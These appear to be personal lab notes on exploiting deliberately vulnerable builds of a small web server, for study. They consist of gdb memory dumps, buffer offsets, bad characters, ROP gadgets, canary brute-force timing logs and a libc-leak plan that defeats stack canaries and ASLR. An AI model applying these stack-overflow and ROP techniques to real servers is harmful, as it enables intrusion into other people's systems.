
https://tex.stackexchange.com/questions/497431/drawing-a-memory-layout-diagram-with-tikz

1996
http://phrack.org/issues/49/14.html#article
https://insecure.org/stf/smashstack.html

https://link.springer.com/chapter/10.1007/978-3-319-99828-2_21

# exploit for tiny.1996

gdb setup:
```
set set-follow-fork-mode child
set disable-randomization off
```



```
0x00007fffffffd660     d8 db ff ff ff 7f 00 00 90 d7 4e 00 00 00 00 00    ..........N.....
0x00007fffffffd670     01 00 00 00 00 00 00 00 fc d3 40 00 00 00 00 00    ..........@.....
0x00007fffffffd680     18 00 00 00 30 00 00 00 a0 d8 ff ff ff 7f 00 00    ....0...........
0x00007fffffffd690     e0 d7 ff ff ff 7f 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd6a0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd6b0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd6c0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd6d0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd6e0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd6f0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd700     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd710     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd720     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd730     00 00 00 00 00 00 00 00 00 fe c8 3d 38 dc 9a 74    ...........=8..t
0x00007fffffffd740     00 00 00 00 00 00 00 00 b2 b6 40 00 00 00 00 00    ..........@.....
0x00007fffffffd750     01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd760     80 8c 4f 00 00 00 00 00 00 00 00 00 00 00 00 00    ..O.............
0x00007fffffffd770     00 00 00 00 00 00 00 00 a8 f4 45 00 00 00 00 00    ..........E.....
0x00007fffffffd780     80 8c 4f 00 00 00 00 00 80 8c 4f 00 00 00 00 00    ..O.......O.....
0x00007fffffffd790     70 8c 4f 00 00 00 00 00 70 8c 4f 00 00 00 00 00    p.O.....p.O.....
0x00007fffffffd7a0     d8 db ff ff ff 7f 00 00 90 d7 4e 00 00 00 00 00    ..........N.....
0x00007fffffffd7b0     01 00 00 00 00 00 00 00 fc d3 40 00 00 00 00 00    ..........@.....
0x00007fffffffd7c0     18 00 00 00 30 00 00 00 a0 d8 ff ff ff 7f 00 00    ....0...........
0x00007fffffffd7d0     e0 d7 ff ff ff 7f 00 00 00 00 00 e0 38 dc 9a 74    ............8..t
0x00007fffffffd7e0     04 00 00 00 00 00 00 00 0f 27 00 00 00 00 00 00    .........'......
0x00007fffffffd7f0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd800     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd810     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd820     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd830     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd840     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd850     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd860     00 00 00 00 00 00 00 00 00 fe c8 3d 38 dc 9a 74    ...........=8..t
0x00007fffffffd870     00 00 00 00 00 00 00 00 e8 db ff ff ff 7f 00 00    ................
0x00007fffffffd880     f0 d9 ff ff ff 7f 00 00 01 00 00 00 00 00 00 00    ................
0x00007fffffffd890     f0 d9 ff ff ff 7f 00 00 1d 2e 40 00 00 00 00 00    ..........@.....
0x00007fffffffd8a0     d8 db ff ff ff 7f 00 00 53 8f 30 68 01 00 00 00    ........S.0h....
0x00007fffffffd8b0     f8 d9 ff ff ff 7f 00 00    ........

```

workflow:

```
(pkill tiny || true) && gdb ./tiny
```

we can assume the socket is on fd 3

we can just read and write to that fd


parse_request (before call to bugged url_decode):
  rsp: c590
  rbp: d5c0
```
0x00007fffffffd570     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd580     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd590     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd5a0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd5b0     00 00 00 00 00 00 00 00 a0 c5 ff ff ff 7f 00 00    ................
0x00007fffffffd5c0     a0 d8 ff ff ff 7f 00 00 c3 2a 40 00 00 00 00 00    .........*@.....

```

url_decode, before logic execution:
 p $rsp
(void *) 0x7fffffffc550
 p $rbp
(void *) 0x7fffffffc580

```
0x00007fffffffc550     a0 cd ff ff ff 7f 00 00 a0 d1 ff ff 00 04 00 00    ................
0x00007fffffffc560     70 d6 ff ff ff 7f 00 00 a0 c5 ff ff ff 7f 00 00    p...............
0x00007fffffffc570     a2 cd ff ff ff 00 00 00 a0 c5 ff ff ff 7f 00 00    ................
0x00007fffffffc580     c0 d5 ff ff ff 7f 00 00 84 26 40 00 00 00 00 00    .........&@.....
```

first byte moved:
c5a0 -> d670   (0x61)

last byte moved:
c7cf -> d89f  (0x61)

last operation before return: set byte to zero at d8a0

total bytes moved: 0x10d0 (4304)



parse_request (after call to bugged url_decode):
  rsp: c590
  rbp: d5c0

(all good here)

process (after call to parse_request):
  rsp d5d0
  rbp d8a0 (exactly where we just wrote the \0)

```
gefâž¤  hexdump byte $rsp --size=800
0x00007fffffffd5d0     d0 d9 ff ff ff 7f 00 00 00 00 00 00 04 00 00 00    ................
0x00007fffffffd5e0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd5f0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd600     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fffffffd610     01 00 00 00 00 00 00 00 00 00 00 e4 ff ff ff ff    ................
0x00007fffffffd620     e0 56 47 00 00 00 00 00 00 00 00 00 00 00 00 00    .VG.............
0x00007fffffffd630     d0 d8 ff ff ff 7f 00 00 00 01 00 00 00 00 00 00    ................
0x00007fffffffd640     d0 d8 ff ff 39 39 39 33 00 71 68 3a 56 83 cb 16    ....9993.qh:V...
0x00007fffffffd650     00 00 00 00 00 00 00 00 f8 db ff ff ff 7f 00 00    ................
0x00007fffffffd660     00 da ff ff ff 7f 00 00 01 00 00 00 00 00 00 00    ................
0x00007fffffffd670     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd680     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd690     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd6a0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd6b0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd6c0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd6d0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd6e0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd6f0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd700     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd710     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd720     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd730     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd740     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd750     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd760     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd770     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd780     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd790     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd7a0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd7b0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd7c0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd7d0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd7e0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd7f0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd800     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd810     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd820     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd830     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd840     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd850     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd860     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd870     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd880     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd890     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd8a0     00 da ff ff ff 7f 00 00 1d 2e 40 00 00 00 00 00    ..........@.....
0x00007fffffffd8b0     e8 db ff ff ff 7f 00 00 53 8f 30 68 01 00 00 00    ........S.0h....
0x00007fffffffd8c0     08 da ff ff ff 7f 00 00 00 00 00 00 10 00 00 00    ................

```

buffer starts at d670

before returning, the function does several operations, that overwrite the
last bytes before rbp. this is the stack immediately before "leave;ret"

```
0x00007fffffffd7b0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd7c0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd7d0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd7e0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd7f0     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd800     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd810     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd820     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd830     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd840     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd850     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd860     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd870     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fffffffd880     61 61 61 61 61 61 61 61 5d 03 4c 00 00 00 00 00    aaaaaaaa].L.....
0x00007fffffffd890     61 61 61 61 61 61 61 61 ff ff ff ff 94 01 00 00    aaaaaaaa........
0x00007fffffffd8a0     00 da ff ff ff 7f 00 00 1d 2e 40 00 00 00 00 00    ..........@.....
0x00007fffffffd8b0     e8 db ff ff ff 7f 00 00 53 8f 30 68 01 00 00 00    ........S.0h....
0x00007fffffffd8c0     08 da ff ff ff 7f 00 00 00 00 00 00 10 00 00 00    ................
0x00007fffffffd8d0     2f 68 6f 6d 65 2f 61 6c 2f 70 72 6f 6a 65 63 74    /home/al/project

```

from this, we can see that we control the whole buffer between 
d670 and d880


#writing shellcode:

useful context:

socket fd is saved in process: 
$rbp-0x2c4 (d5dc)
(it's probably always 4 in a demo)
(slightly above our evil buffer)

evil buffer starts at:
$rbp-0x230 (d670)

evil buffer cannot contain:
0x00
0x20
0x0a
0x0d



## rop chain:
```
rp++ --unique -r2 -f ./tiny | less
```
0x4283fb: add al, ch ; call rsp ; (1 found)



# exploit for tiny.canary

gdb setup:
```
set set-follow-fork-mode child
set disable-randomization off
```


memory in process frame:

```
0x00007ffc65ed0fd0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007ffc65ed0fe0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007ffc65ed0ff0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007ffc65ed1000     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007ffc65ed1010     00 00 00 00 00 00 00 00 00 1f 27 86 1e dd 8d 3e    ..........'....>
0x00007ffc65ed1020     00 00 00 00 00 00 00 00 98 13 ed 65 fc 7f 00 00    ...........e....
0x00007ffc65ed1030     a0 11 ed 65 fc 7f 00 00 00 1f 27 86 1e dd 8d 3e    ...e......'....>
0x00007ffc65ed1040     a0 11 ed 65 fc 7f 00 00 1a 30 40 00 00 00 00 00    ...e.....0@.....
0x00007ffc65ed1050     88 13 ed 65 fc 7f 00 00 53 8f 30 68 01 00 00 00    ...e....S.0h....
0x00007ffc65ed1060     a8 11 ed 65 10 00 00 00 0f 27 00 00 03 00 00 00    ...e.....'......
0x00007ffc65ed1070     04 00 00 00 00 00 00 00 90 10 ed 65 fc 7f 00 00    ...........e....
gefâž¤  p $rbp
$3 = (void *) 0x7ffc65ed1040

```


buff starts at rbp-0x220


enumeration ideas:

read /proc/self/status,
where ppid is listed.
then read the stdio of proc/ppid/fd/1
nope, cannot red from /proc with sendfile, or seek

https://stackoverflow.com/questions/26209126/why-need-to-sleep1-to-allow-socket-to-drain

Ok, this is a good compromise:
- we modify the original source to fork after accept
- we modify the original source to avoid a null byte
  at the end of the buffer

This is enough to enable canary bruteforce without
drastical changes to the code, and without adding additional vulns.



time elapsed: 0.7980912240454927
EOF
time elapsed: 0.7928026480367407
EOF
time elapsed: 0.7992816959740594
mean: 0.797830272539674
std: 0.0015788951362567722
 n:30
EOF
time elapsed: 0.7990963340271264
treshold: 0.8018654680601635
NOCRASH time: 0.7990963340271264 is_crash: False
EOF
time elapsed: 2.1265004761517048e-05
treshold: -505.2957534762882
CRASH time: 2.1265004761517048e-05 is_crash: True
EOF
time elapsed: 0.7987549600657076
treshold: 0.5856548068327226
NOCRASH time: 0.7987549600657076 is_crash: False
EOF
time elapsed: 2.1566986106336117e-05


## rop chain:

rp++ --unique -r2 -f ./tiny | less

0x42862b: add al, ch ; call rsp ; (1 found)



# tiny.all

buffer starts at rbp-0x220 (identical to the canary version)

this is the stack frame:

```
0x00007fff6603e700     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fff6603e710     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fff6603e720     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fff6603e730     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fff6603e740     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fff6603e750     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fff6603e760     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fff6603e770     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fff6603e780     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fff6603e790     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fff6603e7a0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0x00007fff6603e7b0     20 e9 03 66 ff 7f 00 00 00 3e a0 c2 9a f1 4e b0     ..f.....>....N.
0x00007fff6603e7c0     20 e9 03 66 ff 7f 00 00 0e 0b 3f 8b 4b 56 00 00     ..f......?.KV..
0x00007fff6603e7d0     38 ea 03 66 ff 7f 00 00 00 80 00 00 01 00 00 00    8..f............
0x00007fff6603e7e0     00 00 0c 00 10 00 00 00 0f 27 00 00 03 00 00 00    .........'......
0x00007fff6603e7f0     04 00 00 00 00 00 00 00 10 e8 03 66 ff 7f 00 00    ...........f....
gefâž¤  p $rbp
$1 = (void *) 0x7fff6603e7c0

```



context at the start of the rop chain:

```
$rax   : 0x1
$rbx   : 0x0
$rcx   : 0x1
$rdx   : 0x0
$rsp   : 0x007fff6603e7c8  â†’  0x00564b8b3f0b0e  â†’  <main+585> mov edi, 0x1
$rbp   : 0x007fff6603e920  â†’  0x0000000000000001
$rsi   : 0x00564b8cf852a0  â†’  "127.0.0.1:47584 404 - aaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"
$rdi   : 0x007fff6603df40  â†’  0x00712455462050  â†’  0x88bf8b48fa1e0ff3
$rip   : 0x00564b8b3f08c4  â†’  <process+545> ret
$r8    : 0x0
$r9    : 0x7fffffff
$r10   : 0x0
$r11   : 0x246
$r12   : 0x007fff6603ea38  â†’  0x007fff6603ffee  â†’  "/home/al/projects/simple-webserver-vuln/tiny.all"
$r13   : 0x00564b8b3f08c5  â†’  <main+0> endbr64
$r14   : 0x00564b8b3f2c78  â†’  0x00564b8b3ef620  â†’  <__do_global_dtors_aux+0> endbr64
$r15   : 0x007124557e5040  â†’  0x007124557e62e0  â†’  0x00564b8b3ed000  â†’   jg 0x564b8b3ed047

```


rsp-0x300 immediately before `ret`.
all addresses containing 0x564b... are in executable memory
```
gefâž¤  hexdump byte $rsp-0x300 --size=0x400
0x00007fff6603e4c8     38 ea 03 66 ff 7f 00 00 c0 e7 03 66 ff 7f 00 00    8..f.......f....
0x00007fff6603e4d8     ae 08 3f 8b 4b 56 00 00 00 e8 03 66 ff 7f 00 00    ..?.KV.....f....
0x00007fff6603e4e8     e9 cd 7b 55 04 00 00 00 08 b9 7a 55 24 71 00 00    ..{U......zU$q..
0x00007fff6603e4f8     94 01 00 00 ff ff ff ff 00 00 00 00 00 00 00 00    ................
0x00007fff6603e508     5d 13 3f 8b 4b 56 00 00 60 4f 7e 55 24 71 00 00    ].?.KV..`O~U$q..
0x00007fff6603e518     d8 ca 7a 55 24 71 00 00 00 00 00 00 00 00 00 00    ..zU$q..........
0x00007fff6603e528     c0 e5 03 66 ff 7f 00 00 01 00 00 00 00 00 00 00    ...f............
0x00007fff6603e538     00 00 00 e4 ff ff ff ff 20 25 44 55 24 71 00 00    ........ %DU$q..
0x00007fff6603e548     00 00 00 00 00 00 00 00 10 e8 03 66 ff 7f 00 00    ...........f....
0x00007fff6603e558     00 01 00 00 00 00 00 00 10 e8 03 66 39 39 39 33    ...........f9993
0x00007fff6603e568     00 3e a0 c2 9a f1 4e b0 00 00 00 00 00 00 00 00    .>....N.........
0x00007fff6603e578     00 00 00 00 00 00 00 00 20 e9 03 66 ff 7f 00 00    ........ ..f....
0x00007fff6603e588     38 ea 03 66 ff 7f 00 00 c5 08 3f 8b 4b 56 00 00    8..f......?.KV..
0x00007fff6603e598     78 2c 3f 8b 4b 56 00 00 61 61 61 61 61 61 61 61    x,?.KV..aaaaaaaa
0x00007fff6603e5a8     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
0x00007fff6603e5b8     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa
```


ret addr: (last 3 nibbles)
     0x00005638632fbb0e
                    ---

call log_access (last 3 nibbles)
    0x...8a9

```
0x00005638632fb3d6 <+240>:   mov    rdx,rax
0x00005638632fb3d9 <+243>:   lea    rcx,[rbp-0x420]
0x00005638632fb3e0 <+250>:   mov    eax,DWORD PTR [rbp-0x424]
0x00005638632fb3e6 <+256>:   mov    rsi,rcx
0x00005638632fb3e9 <+259>:   mov    edi,eax
0x00005638632fb3eb <+261>:   call   0x5638632fa69f <writen>
    writen(fd, buf, strlen(buf));
```

socket fd is saved at
$rbp-0x2d4

(note: rbp is lost before ret, but we can get the same addr relative to rsp)


the whole code range is this:
0x00005638632fa000
0x00005638632fc000

0x00005638632fbb0e
              |
              this is the only byte that can cause side effects

it seems that we can easily bruteforce the ret addr.
when it's wrong, we will have an immediate crash without sleep.
to increase the chances of crashes when the addr is wrong
we'll also set the rbp to 0


## leak libc

now we can succesffully leak the program base offsets.
we need a ropchain that will leak libc.

the only pop gadgets are:
```
pop r12
pop rbp
pop rsp
```

these gadget, combined with a writable const address, and a pop rbp,
allow us to write into rax or rbx
```
0x271e: mov rax, qword [rbp-0x38] ; leave ; ret ; (1 found)
0x3405: mov rbx, qword [rbp-0x08] ; leave ; ret ; (1 found)
```

if we control rax, we also control the lower byte of rcx, via this gadget:
```
0x2651: add byte [rcx], al ; pop rbp ; ret ; (1 found)
```

since we compiled on gcc with no optimizations,
almost all function calls move data into rax or rbx before
moving them into rdi or rsi.
we can probably call some functions in this way.


leave:
mov esp, ebp
pop ebp



- some ideas: (meh)
with partial RELRO,
we can probably overwrite part of the sleep function address,
and use the sleep time as an oracle

- some ideas: (good)
since we compiled on gcc with no optimizations,
almost all function calls move data into rax or rbx before
moving them into rdi or rsi.
we can probably call some functions in this way.
if we find a small function that does not touch rdi and that
is called from somewhere with the mov rdi, rax gadget,
we can use that whole function call as a mov rdi, rax gadget.
    there is a function that does not touch rdi:
    rio_readinitb

    called from:
    note: we control the content of rbp
       0x000000000000306b <+88>:    mov    edx,DWORD PTR [rbp-0x1034]
       0x0000000000003071 <+94>:    lea    rax,[rbp-0x1020]
       0x0000000000003078 <+101>:   mov    esi,edx
       0x000000000000307a <+103>:   mov    rdi,rax
       0x000000000000307d <+106>:   call   0x2669 <rio_readinitb>
       0x0000000000003082 <+111>:   lea    rcx,[rbp-0xc10]
this effectively gives us a primitive to set the content of esi and rdi, with the constraint
that it must be a writable and readable address, that will be partially written.

This is also valid as an arbitrary mem write, with some extra writes as a side effect.


- some ideas: (meh)
since we control rbp, and we know the address of got and plt,
we can put these addresses in both rax and rbx:
```
0x271e: mov rax, qword [rbp-0x38] ; leave ; ret ; (1 found)
0x3405: mov rbx, qword [rbp-0x08] ; leave ; ret ; (1 found)
```
we now need some way to leak rax or rbx back to us
issue here: we cannot call leave before ret with a broken rbp, we'll lose the rop chain



note:
default_mime_type points to a huge area of rw- memory, immediately before r-- got
    0x000055555555a100 <default_mime_type+0000>    d1 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00    .@..............



another useful gadget:
This is probably the easiest thing we can call, and the starting point for this problem:
we want to call write, with rdi set to 4, and rsi set to a pointer to libc
```
   0x00000000000026c8 <+41>:    mov    rdx,QWORD PTR [rbp-0x18]
   0x00000000000026cc <+45>:    mov    rcx,QWORD PTR [rbp-0x8]
   0x00000000000026d0 <+49>:    mov    eax,DWORD PTR [rbp-0x24]
   0x00000000000026d3 <+52>:    mov    rsi,rcx
   0x00000000000026d6 <+55>:    mov    edi,eax
   0x00000000000026d8 <+57>:    call   0x2320 <write@plt>
```
this is the memory we need to construct when we call write@plt
```
legend: rbp:          __
        rbp-8:        _S  (rsi - pointer to libc addr)
        rbp-0x18(24): _X  (rdx - N bytes to read)
        rbp-0x24(36): _D  (rdi - file descriptor)

0x0000555555559e28   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x0000555555559e28   00 00 00 00 _D 00 00 00 00 00 00 00 00 00 00 00
0x0000555555559e28   _X 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x0000555555559e28   _S 00 00 00 00 00 00 00 __ 00 00 00 00 00 00 00
0x0000555555559e28   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x0000555555559e28   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x0000555555559e28   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

luckily, we have a lot of other instances of calls to writen:
```
   0x00000000000033d6 <+240>:   mov    rdx,rax
   0x00000000000033d9 <+243>:   lea    rcx,[rbp-0x420]
   0x00000000000033e0 <+250>:   mov    eax,DWORD PTR [rbp-0x424]
   0x00000000000033e6 <+256>:   mov    rsi,rcx
   0x00000000000033e9 <+259>:   mov    edi,eax
   0x00000000000033eb <+261>:   call   0x269f <writen>

```






## tiny.all v2

this is our saved ret addr.
0x59a37cbb451c <main+392>
          |...
          |
          possible side effects


executable code is in the range:
0x59a37cbb3000
0x59a37cbb5000


gadgets:

```
0x2c2c: adc ecx,  [rax-0x7D] ; ret ; (1 found)
```

registers at the start of the chain:
```
$rax   : 0x265
$rbx   : 0x6262626262626262 ("bbbbbbbb"?)
$rcx   : 0x1
$rdx   : 0x0
$rsp   : 0x007fffd475a8a8  â†’  0x0059f5fde2d51c  â†’  <main+392> mov edi, 0x1
$rbp   : 0x6262626262626262 ("bbbbbbbb"?)
$rsi   : 0x0059f5fee972a0  â†’  "127.0.0.1:54354 404 - aaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]"
$rdi   : 0x007fffd475a050  â†’  0x007d8964462050  â†’  0x88bf8b48fa1e0ff3
$rip   : 0x0059f5fde2d305  â†’  <process+279> ret
$r8    : 0x0
$r9    : 0x7fffffff
$r10   : 0x0
$r11   : 0x246
$r12   : 0x6262626262626262 ("bbbbbbbb"?)
$r13   : 0x6262626262626262 ("bbbbbbbb"?)
$r14   : 0x0059f5fde2fca0  â†’  0x0059f5fde2c580  â†’  <__do_global_dtors_aux+0> endbr64
$r15   : 0x007d896468f040  â†’  0x007d89646902e0  â†’  0x0059f5fde2a000  â†’   jg 0x59f5fde2a047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]

```

note that we fully control:
```
rbx
rbp
r12
r13

r14
r15
rdi
rsi
```

our issue: rdx is 0


idea 1:

maybe some libc call will clobber rdx? we need any value != 0.

this is what we can call
```
[0x59f5fde2feb0] localtime@GLIBC_2.2.5  â†’  0x7d89644d8f70
[0x59f5fde2feb8] __errno_location@GLIBC_2.2.5  â†’  0x7d896442a250
[0x59f5fde2fec0] strcpy@GLIBC_2.2.5  â†’  0x7d896459ecb0
[0x59f5fde2fec8] setsockopt@GLIBC_2.2.5  â†’  0x7d8964527ac0
[0x59f5fde2fed0] write@GLIBC_2.2.5  â†’  0x7d8964514870
[0x59f5fde2fed8] getpid@GLIBC_2.2.5  â†’  0x7d89644ec040
[0x59f5fde2fee0] inet_ntoa@GLIBC_2.2.5  â†’  0x7d8964536670
[0x59f5fde2fee8] strlen@GLIBC_2.2.5  â†’  0x7d896459d7e0
[0x59f5fde2fef0] openat@GLIBC_2.4  â†’  0x7d8964514670
[0x59f5fde2fef8] chdir@GLIBC_2.2.5  â†’  0x7d8964515170
[0x59f5fde2ff00] __stack_chk_fail@GLIBC_2.4  â†’  0x7d8964536550
[0x59f5fde2ff08] strrchr@GLIBC_2.2.5  â†’  0x7d896459d610
[0x59f5fde2ff10] getcwd@GLIBC_2.2.5  â†’  0x7d89645151d0
[0x59f5fde2ff18] close@GLIBC_2.2.5  â†’  0x7d8964514f50
[0x59f5fde2ff20] closedir@GLIBC_2.2.5  â†’  0x7d89644e64b0
[0x59f5fde2ff28] read@GLIBC_2.2.5  â†’  0x7d89645147d0
[0x59f5fde2ff30] strcmp@GLIBC_2.2.5  â†’  0x7d8964598940
[0x59f5fde2ff38] strtol@GLIBC_2.2.5  â†’  0x7d89644474e0
[0x59f5fde2ff40] __sysv_signal@GLIBC_2.2.5  â†’  0x7d8964443030
[0x59f5fde2ff48] readdir@GLIBC_2.2.5  â†’  0x7d89644e6680
[0x59f5fde2ff50] __isoc99_sscanf@GLIBC_2.7  â†’  0x7d8964462250
[0x59f5fde2ff58] listen@GLIBC_2.2.5  â†’  0x7d8964527620
[0x59f5fde2ff60] sendfile@GLIBC_2.2.5  â†’  0x7d8964519170
